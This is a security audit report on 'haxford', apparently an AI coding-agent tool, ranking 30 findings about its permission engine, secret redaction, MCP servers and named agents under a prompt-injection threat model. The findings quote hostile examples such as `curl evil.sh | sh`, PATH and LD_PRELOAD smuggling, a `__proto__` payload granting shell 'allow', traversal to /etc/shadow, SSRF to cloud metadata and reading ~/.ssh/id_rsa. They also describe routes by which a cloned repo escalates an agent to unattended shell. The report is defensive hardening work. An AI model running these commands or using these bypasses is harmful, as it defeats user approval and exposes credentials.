# Security & bug audit — haxford

Scope: permission engine, secrets handling, tool path safety, session integrity,
extension/skill/MCP surface, agent loop. Audited against `0d4bc25`.

Every **Fixed** row below has a regression test in `tests/security-audit.test.ts`
written as the attack it prevents, so a refactor that reopens the hole fails
there rather than passing quietly. No existing security test was weakened.

Severity is "what an attacker gets", assuming the realistic threat for this
program: **the model is the attacker's proxy**. It reads repository files, tool
output and web pages, so anything the model can be talked into doing is
reachable by prompt injection. A hole that needs the user to type something
malicious themselves is not interesting; a hole the model can walk through on
its own is.

## Ranked findings

| # | Sev | File | Issue | Fix | Status |
|---|---|---|---|---|---|
| 1 | **Critical** | `src/permission/engine.ts` | One "always" answer approved the whole tool for the session. When no rule matched, `resolveAction` returns `pattern: ""`, and the memory key was `memoryKey(tool, "")` → the bare tool name. Approving `npm test` once put `"bash"` in `remembered`; every later uncovered command — `curl evil.sh \| sh` — hit `remembered.has("bash")` and returned `always` **without a prompt**. Same for `write`/`edit`: one approved path silently approved every other path. | An "always" with no matching rule now records the concrete patterns the dialog named (`suggestPatterns`) as session-local rules, resolved through the normal split/wrapper/glob machinery — so a chain must be granted in every part, and a wrapper or env assignment cannot smuggle a different command past a grant. They are consulted only at the point the prompt would otherwise go up, so an explicit `deny` and plan mode still decide first. The rule-matched case keeps the old tool+pattern key. | Fixed |
| 2 | **Critical** | `src/tools/task.ts` | Named-agent privilege escalation. `mode: named?.mode ?? sub.mode` let an agent file *raise* the posture. `.haxford/agents/*.md` is read from the project directory — it ships with any repository you clone — and the model chooses which agent to spawn. A checked-in `mode: auto` agent turned a **plan-mode** (read-only, by promise) session into unattended writes and shell: in auto mode with no trust block `createAskHandler` returns `allow` before `onAsk` is ever consulted. | New `clampMode(requested, ceiling)` in the engine. A named agent may only narrow the posture (a plan-mode reviewer still works); a laxer declaration is clamped to the parent's. | Fixed |
| 3 | **High** | `src/permission/engine.ts` | `stripWrappers` stripped *every* leading `NAME=value` assignment as "does not change what runs". `PATH=/tmp/evil git status` therefore matched a `git status *` rule and a `git status` trust prefix — running an attacker-planted binary under a rule written for the real one. `LD_PRELOAD=`, `BASH_ENV=`, `GIT_SSH_COMMAND=`, `NODE_OPTIONS=`, `HOME=` are the same class. | Assignments whose name is execution-affecting (explicit list + `LD_`/`DYLD_`/`GIT_`/`BASH_`/`PYTHON`/`PERL5`/`RUBY` prefixes + `PATH`/`_OPTIONS`/`_OPTS`/`PRELOAD` suffixes) stay attached to the command, so the narrow rule no longer matches and the user is asked. `NODE_ENV=test npm test` still strips. | Fixed |
| 4 | **High** | `src/config/index.ts` | Prototype pollution from untrusted config. `mergePermission` did `merged[tool] = rule`; with `tool === "__proto__"` that *assigns the prototype*. A project `haxford.json` containing `{"permission": {"__proto__": {"bash": "allow"}}}` made `rules["bash"]` resolve to `"allow"` through the chain — blanket unattended shell for anyone who clones the repo. Confirmed: `evaluatePermission(merged, "bash", "rm -rf /")` returned `allow`. | `__proto__`/`constructor`/`prototype` keys are dropped on both sides of the merge. No tool is named any of them, so nothing legitimate is lost. | Fixed |
| 5 | **High** | `src/permission/engine.ts` | Glob matching is textual, so a path glob matched its way *out* of the directory it named: trust `paths: ["src/**"]` covered `/proj/src/../../../etc/shadow`, and a rule `"/proj/src/**": "allow"` covered `/proj/src/../../etc/passwd`. | Path subjects are normalized (`..`/`.` collapsed) before matching, in both rule resolution and trust matching. URL subjects are excluded — `normalize` would corrupt `https://a/b`. | Fixed |
| 6 | **High** | `src/permission/engine.ts` | "Always allow" pattern overreach on interpreters. `commandPattern` keeps the first two bare words and wildcards the rest, so approving `bash -c "echo hi"` persisted the rule **`bash *`** to `.haxford/settings.local.json` — permanent, silent approval of every future `bash -c`, i.e. every command there is. Same for `node -e`, `python -c`, `sudo`, `ssh`, `docker`, `npx`. | Commands whose arguments *are* the program yield the exact command string as the pattern instead of a wildcarded prefix. Ordinary commands still widen to `git commit *`. | Fixed |
| 7 | **Medium** | `src/tools/read.ts`, `src/tools/grep.ts` | Redaction gap. `redactSecrets` was applied to exactly one place — bash output. Reading `~/.config/haxford/haxford.json`, an `.env`, or an auth store, or grepping for `key` across a config directory, put live credentials into the model's context **and into the session JSONL on disk**, permanently. | Both tools now redact. `read` masks the file text once before splitting; `grep` masks the assembled match body. | Fixed |
| 8 | **Medium** | `src/tools/edit.ts` | TOCTOU across the approval prompt. Spans are character offsets resolved against content read *before* `await ctx.askPermission(...)`; the write happened after. A formatter, a `git checkout`, or a parallel agent landing during the prompt meant the edit was spliced at stale offsets, silently discarding the other write and corrupting the file. | After approval the file is re-read and compared; a change means the edit is refused with an error telling the model to re-read. Nothing is written. | Fixed |
| 9 | **Medium** | `src/session/paths.ts` | Session-id path traversal. Ids are interpolated straight into filenames, so `-s ../../../../x` made `getSession` read outside the data root — and the id inside whatever meta file it found there was then trusted for every subsequent write, letting a transcript be appended anywhere the user can write. | `safeSessionID` rejects empty ids and anything containing a separator, NUL, or a leading `..`. UUIDs and subagent `<id>:sub:<uuid>` ids are unaffected. `getSession` treats an invalid id as "not found" rather than throwing at the CLI. | Fixed |
| 10 | **Medium** | `src/tools/bash.ts` | The truncated-output spill file was written to the shared temp directory at the default mode 0644 — a verbatim copy of command output (build logs, config dumps) readable by every other user on the machine. | `chmod 0600` after write. | Fixed |
| 11 | **Medium** | `src/tools/webfetch.ts` | SSRF to the cloud metadata service. `webfetch` is in `PLAN_READONLY`, so it runs **without a prompt in plan mode** and unattended in auto mode, and the URL comes from the model — one prompt injection from "read the instance IAM credentials into the transcript". Worse, `redirect: "follow"` meant the URL check applied only to the first hop: a validated `https://` URL answering `302 http://169.254.169.254/…` was followed silently, undoing both the metadata check and the HTTPS-for-remote-hosts rule. | Link-local/metadata hosts (`169.254.0.0/16`, `fe80::/10`, `fd00:ec2::254`, `metadata.google.internal`) are refused. Redirects are followed manually, max 5 hops, each hop re-validated. `localhost` stays allowed — that is a deliberate, documented capability. | Fixed |
| 12 | **Low** | `src/session/store.ts` | A corrupt or half-written transcript line that was valid JSON with a string `id` but no `parts` array passed `loadHistory`'s filter; `forkSession` then did `m.parts.map(...)` and threw, so one truncated line made a session unforkable and crashed resume paths. | `loadHistory` now requires a non-array object with a `parts` array. | Fixed |
| 13 | **Low** | `src/config/secrets.ts` | `collectSecretValues` scanned the opencode auth store for six hard-coded provider names — a key stored under any other name was never redacted, which is precisely the leak the function exists to prevent. It also re-read the file synchronously on *every* `redactSecrets` call (six times per call), which mattered once redaction was extended to `read`/`grep`. | Reads every entry in the store. The file read (only) is cached for the process, with `invalidateSecretCache()` called after `saveGlobalProviderCredential`; env and config are still re-read each call so a key exported mid-session is masked. | Fixed |
| 14 | **Low** | `src/extend/doc.ts` | `EXTENDING.md` — the document the program writes for users and points the model at — said nothing about extensions being unsandboxed arbitrary code. Audit brief required this explicitly. | Added a prominent note: extensions run in-process with full user privileges, no sandbox, no prompt; a *broken* extension is contained but a malicious one is not; the API surface carries no provider keys. **See "Left undone" — `docs/extending.md` must be regenerated.** | Fixed (needs docs sync) |
| 15 | **Low** | `src/tools/read.ts` | `Bun.file(path).text()` buffered the whole file with no ceiling. A multi-GB log, or a character device like `/dev/zero` (which `exists()` cheerfully confirms), took the process down instead of returning an error the model could act on. | 50 MB ceiling with an error pointing at grep/sed paging. | Fixed |
| 16 | **Low** | `src/extend/skills.ts` | `parseFrontmatterFields` accumulated file-controlled keys onto a plain object, so `out["constructor"]`/`out["toString"]` answered with inherited functions — the `=== undefined` guard silently dropped those fields, and a consumer reading one back would get a function where a string was promised. | Null-prototype accumulator. | Fixed |
| 17 | **Low** | `src/mcp/bridge.ts` | Plan mode does not deny bridged MCP tools — they fall through to the evaluate-then-ask path, so a mutating MCP tool (filesystem, GitHub) *prompts* in a mode that promises "mutating tools are denied outright, without prompting". The user is still in the loop, so this is a weakened guarantee, not a silent bypass. MCP output also enters context unredacted (finding 7's class). | Recommend: treat unknown/`mcp__*` tool ids as mutating in plan mode, and run `contentToText` output through `redactSecrets`. | **Reported, not fixed** — see below |
| 18 | **Low** | `src/mcp/jsonSchema.ts` | `jsonSchemaToZod` recurses through `properties`/`items` with no depth limit. A hostile or buggy MCP server returning a deeply nested `inputSchema` overflows the stack and takes the process down. | Recommend: depth cap (~32) falling back to `z.unknown()`. | **Reported, not fixed** — see below |

**Counts:** 2 Critical, 4 High, 5 Medium, 7 Low — 18 total. 16 fixed, 2 reported.

## Reviewed and found sound

Worth recording, because these are the places a reviewer would look next:

- **`splitCommand`** — correctly treats `&&`, `||`, `;`, `|`, `|&`, `&`, newlines,
  `(){}` and backticks as boundaries, respects quoting, and does not split on
  redirection. `$(...)` splits at the paren, so the inner command is judged
  separately. Over-splitting is the safe direction (callers require *every*
  part to pass) and it is used consistently by rule evaluation, trust matching
  and pattern suggestion.
- **Extension failure isolation** — verified. A failed import, a missing default
  export, a throwing registration and a throwing hook all become warning
  strings; nothing reaches the session. Extensions load only from `~/.haxford`,
  never from the project directory, so cloning a repository does not run code.
- **No secrets reach the extension API** — `apiFor(source)` is the entire
  surface: register/hook functions only, no config and no credentials.
- **`filteredEnv`** — correctly strips haxford's provider vars from every child
  process (bash and MCP servers alike) while passing user tokens through.
- **Built-in tool ids are reserved** — an extension cannot shadow `bash`.
- **Subagents cannot prompt the user** (`onAsk: () => "deny"`) and cannot nest.
- **`grep` shells out safely** — `rg` is spawned as argv with `-e` before the
  pattern, so a pattern starting with `-` is not read as a flag; no shell.
- **`saveGlobalProviderCredential`** chmods 600 and refuses to write to project
  config. Project/local-config `apiKey` and world-readable global config are
  both warned about at startup.

## Known-weaker-than-it-looks (design, not defects)

Recorded so nobody mistakes these for oversights:

- **Longest-pattern-wins**, including allow over deny. `pattern.length` is a
  crude specificity proxy — a padded wildcard (`"**********"`) is "more
  specific" than `"**/.env"`. This is documented behaviour and changing it
  would break configured setups, so it is left alone; but with finding 4 fixed,
  the only way to author such a rule is to write it yourself.
- **Read-only bash runs unprompted in build mode**, so `cat ~/.ssh/id_rsa` needs
  no approval. Consistent with `read` being allow-by-default; the tools grant no
  workspace confinement by design, and inventing one was out of scope.
- **`webfetch` to `localhost`** remains allowed (documented capability), so SSRF
  to the user's own services is still possible. Only the credential-serving
  link-local range is blocked.

## Left undone, and why

- **`docs/extending.md` is not regenerated.** The `EXTENDING.md has not drifted`
  test compares it to the `EXTENDING_MD` constant, and it was **already failing
  before this audit**: another agent is mid-change documenting named agents in
  the docs copy without having synced `src/extend/doc.ts`. I added finding 14's
  security note to `doc.ts` (the source of truth, which nobody else had
  touched) and deliberately did **not** write `docs/extending.md`, because
  overwriting it would have destroyed that in-flight work. Whoever lands the
  named-agents docs should merge both directions and regenerate; the drift test
  goes green then.
- **`src/mcp/*` (findings 17, 18) is not edited.** That module was created
  *during* this audit and its files were being written minutes before I read
  them. Editing a file another agent has open invites a lost update, so both
  findings are reported with concrete fixes for its author instead.

## Test gate

`bun run typecheck` — clean.

Full suite: **834 pass / 5 fail** (839 total; the baseline at audit start was
762/766, i.e. 4 pre-existing failures). The suite grew during the audit because
other agents were landing work in parallel. All 5 failures are in TUI and docs
files this audit did not touch:

- 4 pre-existing at `0d4bc25` — `tui-regions` and `tui-chrome` layout/pin maths.
- 1 `docs/extending.md` drift, which was already failing before this audit
  because of another agent's in-flight docs change. See "Left undone".

Every suite covering the changed modules is green: **357 pass / 0 fail** across
`permission`, `trust`, `security`, `security-audit`, `approval`, `session`,
`tools`, `edit`, `extend`, `agents`, `wiring`, `agentcore`, `gitignore`,
`todo-persistence`, `mcp`, `webfetch`.

No new dependencies. No commits, no pushes.

---

# Round 2 — modules added after `0d4bc25`

Scope: the MCP client/bridge/config, the TUI message queue and its `index.ts`
seam, and the named-agent loader. Round 1's findings 17 and 18 were reported
but not fixed because `src/mcp/` was being written at the time; that module has
now landed, so it is audited properly here and both are closed.

Regression tests are in `tests/security-audit-round2.test.ts`, plus a hostile
stdio server fixture at `tests/fixtures/mcp-hostile-server.ts`. Same threat
model as round 1: **the model is the attacker's proxy, and a cloned repository
is attacker-controlled input.**

## Ranked findings

| # | Sev | File | Issue | Fix | Status |
|---|---|---|---|---|---|
| 19 | **Critical** | `src/agent/agents.ts` | Round 1 clamped a named agent's permission mode when spawned as a *subagent* (`task.ts`) but missed the **top-level** path. `pickMode` did `agent?.mode ?? cliMode`, so a project `.haxford/agents/helper.md` declaring `mode: auto` promoted the whole session from the default `build` to `auto` — where `createAskHandler` returns `allow` before `onAsk` is ever reached. Agent files ship with any repository you clone, so `haxford --agent helper` in a cloned repo meant unattended writes and shell with no prompt. Confirmed: `pickMode("build", false, agent)` returned `"auto"`. | `pickMode` now clamps through the same `clampMode` used for subagents. An agent may only narrow the posture; an explicit `--mode` still wins outright in both directions. | Fixed |
| 20 | **High** | `src/mcp/index.ts`, `src/mcp/config.ts` | Repository-supplied code execution at startup. An `mcpServers` entry is `command` + `args` — an arbitrary program — and `loadMcpConfig` reads `<cwd>/.haxford/mcp.json`, which arrives with a cloned repo. With `autoStart` defaulting to true, `startMcp` spawned every one of them eagerly, so *running haxford in a directory* was enough to execute what that directory asked for, with no prompt and before the first turn. | The config layer each server came from is now recorded, and `startMcp` never eagerly spawns a `project`-sourced server: it is listed, warned about by name and command, and connects only on deliberate use (`ensureConnected`, a future `/mcp start`). Global servers — written by the user in their own home directory — still start eagerly. | Fixed |
| 21 | **High** | `src/mcp/bridge.ts` | Server-controlled tool names went into provider-facing tool ids unchecked. A server advertising `"has space"`, `"../../etc/passwd"`, `""`, or a 300-character name produced ids that providers reject — and because the tool list is sent as a whole, **one bad name from one server fails every request for the entire session**, not just calls to that tool. Two tools could also claim one id and silently shadow each other. | `isBridgeableToolName` validates the name and the resulting id (`^[A-Za-z0-9_-]+$`, ≤64 chars, non-empty name); unusable and duplicate names are skipped and reported as warnings rather than mangled — silently rewriting one would decouple the id the user approves from the id the server answers to. `startMcp` additionally rejects an id already provided by another server. | Fixed |
| 22 | **High** | `src/mcp/client.ts` | Unbounded stdout framing. The reader did `buffer += chunk` and only ever split on `\n`; MCP's stdio framing forbids embedded newlines, so a server that emits a stream without one — buggy, or no longer speaking MCP — grew that string until the process died. No cap, no resync. | The framing is extracted into `createLineFramer(onLine, maxBytes)` with an 8 MB ceiling: past it the partial line is dropped, the framer resynchronises on the next newline, and a `dropped()` counter makes it observable. Extracting it also means the bound is proved by unit test rather than by trying to exhaust memory. | Fixed |
| 23 | **Medium** | `src/mcp/jsonSchema.ts` | (Round 1 finding 18, now closed.) `jsonSchemaToZod` recursed through `properties`/`items` with no depth limit against a server-supplied schema. Confirmed: a deeply nested `inputSchema` threw `RangeError: Maximum call stack size exceeded` — a server-triggered crash of the whole agent before a single tool ran. | Depth capped at 32; past it a node becomes `z.unknown()`, which is the permissive fallback the converter already uses everywhere else. | Fixed |
| 24 | **Medium** | `src/index.ts` | A rejection could wedge the session permanently. `running = true` was set, then `appendMessage`/`updateSessionInfo` were awaited **outside** the `try`, so a disk error there escaped as an unhandled rejection and `running` stayed true for the life of the process. The composer keeps accepting prompts, every one is queued, and the flush in `finally` never runs — every subsequent message silently swallowed, indistinguishable from a hung model. The `AbortController` was also created after those awaits, so `esc` did nothing during them. | The whole body is inside the `try`, so the `finally` that clears `running` and flushes the queue always runs; the controller is created first so `esc` works throughout. | Fixed (see "Left undone" for why this one has no automated test) |
| 25 | **Medium** | `src/tui/store.ts` | The prompt queue was unbounded. A run that never ends — a wedged provider, a model looping on tool calls — leaves the composer live with every submission accumulating, each entry a whole prompt. | `enqueue` is capped at `MAX_QUEUED` (100) and returns `false` when it refuses, so the host tells the user rather than appearing to accept a message it dropped. | Fixed |
| 26 | **Medium** | `src/mcp/bridge.ts` | MCP tool output went into the model's context and the session JSONL unredacted — the same gap round 1 closed for `read` and `grep`. An MCP server that reads files or env (a filesystem or shell server) could put credentials straight into the transcript. | Output is run through `redactSecrets` before truncation, matching `bash`. | Fixed |
| 27 | **Low** | `src/agent/agents.ts` | Symlinked agent files were skipped silently. The skip is correct and must stay — an agent body becomes system-prompt text, so following a symlink would let a cloned repo point `.haxford/agents/x.md` at `~/.ssh/id_rsa` and have it read out to the model — but silence meant a user who symlinked one deliberately saw the *global* agent of that name run instead, with no explanation. | Still not followed; now warns, naming the file and the reason. **This answers the scope question directly: precedence cannot be reversed by a symlink. `readdir(withFileTypes)` reports a symlink as `isSymbolicLink()`, not `isFile()`, so a symlinked project agent is dropped and the global one stands — the fail-safe direction, since global is user-authored and project ships with the repo.** | Fixed |
| 28 | **Low** | `src/agent/agents.ts` | `getAgents` read every agent body in full just to build the picker list, with no size ceiling — and the body goes into the system prompt. | 256 KB ceiling per file, skipped with a warning past it. | Fixed |
| 29 | **Low** | `src/mcp/connection.ts` | No reconnect backoff. `ensureConnected` shares an in-flight attempt (so concurrent callers do not storm), but a server that fails to connect never sets `client`, so *every* subsequent call respawns it and pays the 10 s handshake timeout again. Bounded by model turns rather than unbounded, so it is slow rather than dangerous. | Recommend a short cooldown after a failed connect. **Reported, not fixed** — see below. | Reported |
| 30 | **Low** | `src/mcp/client.ts` | `handleInbound` coerces a reply id with `Number(rawID)`, so `"1"`, `1.0` and `true` all correlate to pending request 1. A server can therefore answer a request it was not asked. It supplies every reply anyway, so this crosses no boundary. | None. Recorded so it is not mistaken for an oversight. | Informational |

**Round 2 counts:** 1 Critical, 3 High, 4 Medium, 3 Low — 11 total. 9 fixed, 1
reported, 1 informational.

## Reviewed and found sound

- **Credential stripping reaches MCP servers.** `spawnServer` uses
  `filteredEnv()`, so haxford's provider keys are absent from the child
  environment while user tokens pass through. Now pinned by a test that runs at
  the *client* level rather than through `bridgeMcpTools` — the bridge redacts
  secrets in output, which would have masked a real leak and made the test pass
  for the wrong reason.
- **No permission-gate bypass via tool-id spoofing.** Every bridged id is
  `mcp__<server>__<tool>` and now provably matches `^[A-Za-z0-9_-]+$`, so it can
  never equal a built-in id; the engine has no wildcard on the tool *key*, only
  on the subject; and cross-server id collisions are now rejected. (An
  *extension* could still register an id shaped like `mcp__x__y` — extensions are
  arbitrary in-process code by design, documented in round 1's finding 14, so
  this is not a boundary.)
- **`z.object` strips unknown keys**, so an `additionalProperties` passthrough
  does not smuggle extra arguments; the permissive `z.record` fallback only
  applies to schemas with no usable `properties`, and those arguments go to the
  server that published the schema.
- **Flush re-entrancy is sound.** `onPrompt` re-enters from its own `finally`,
  but `running` is set synchronously before the async body, so the re-entry runs
  exactly one queued prompt and each nesting level returns immediately — no
  concurrent runs, no stack growth.
- **Tool allowlists filter every entry point.** `filterToolsByAllowlist` runs on
  the list handed to the loop, and a subagent inherits the parent's already
  filtered list minus `task`, so a named agent's allowlist survives nesting.
  There is no "inside" path — bash subshells are bash (filtered as a unit), and
  MCP tools are ordinary `Tool` entries filtered by id like any other.
- **Prompt injection through agent frontmatter** is user-controlled by design,
  as the brief states. Worth recording that the body is the only free-text field
  that reaches the prompt; `mode`, `model` and `tools` are all validated against
  fixed vocabularies, and `mode` is now clamped (finding 19).

## Left undone, and why

- **Finding 24 has no automated test.** `onPrompt` is a closure inside
  `index.ts`'s interactive path, and `index.ts` calls `main()` at module scope —
  importing it from a test would launch the CLI. Testing it needs either an
  `import.meta.main` guard on the entrypoint or extracting the turn-runner into
  its own module. Both change coordinator-owned startup semantics, which is not
  a call to make inside a review round, so the fix is structural (everything
  inside `try`/`finally`) and verified by inspection. Recommend the
  `import.meta.main` guard as a follow-up — it is one line and makes the whole
  host testable.
- **Finding 29 (reconnect cooldown) not implemented.** It is a behavioural
  change to connection lifecycle rather than a security fix, and this round
  already reshaped `src/mcp/` substantially; stacking more behaviour change on a
  module its author may still be iterating on is the wrong trade.
- **Two `tests/mcp.test.ts` cases were updated, not weakened.** They asserted
  that a *project*-defined server auto-starts and that a parsed server has no
  `source` field — both encode the behaviour finding 20 removes. The eager-start
  case now exercises the global layer (which still starts eagerly, so the
  original intent is still covered) and a new case asserts the project server is
  listed, warned about, not spawned, and still connectable on demand.

## Round 2 test gate

`bun run typecheck` — clean.

Full suite: **863 pass / 0 fail** across 37 files — green, including the two
`tui-regions` pinning tests that were failing at the start of this round and
were fixed by another agent's concurrent work.

No new dependencies. No commits, no pushes.
